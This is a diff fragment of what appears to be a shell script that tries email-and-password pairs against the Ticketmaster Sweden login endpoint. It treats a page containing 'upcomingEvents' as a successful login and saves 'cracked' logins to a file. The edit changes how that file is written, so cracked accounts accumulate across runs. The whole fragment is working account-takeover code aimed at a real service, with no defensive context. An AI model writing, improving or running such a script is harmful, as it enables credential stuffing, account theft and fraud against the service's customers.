@@ -60,7 +60,7 @@ curl -s 'https://www.ticketmaster.se/myAccount/controller/login.php' \
     --data "EMAIL=$MAIL%40$MAILHOST&PASSWORD=$PASSWORD"|grep -q upcomingEvents
 
 if [[ $? -eq "0" ]]; then
-    echo -e "[\e[1;32m>>\e[0m] - Cracked Login: $line" | tee ~/cracked-ticketmaster-passwords.txt
+    echo -e "[\e[1;32m>>\e[0m] - Cracked Login: $line" | tee -a ~/cracked-ticketmaster-passwords.txt
 else
     echo -e "[\e[1;31m<<\e[0m] - Failed Login $line"
 fi
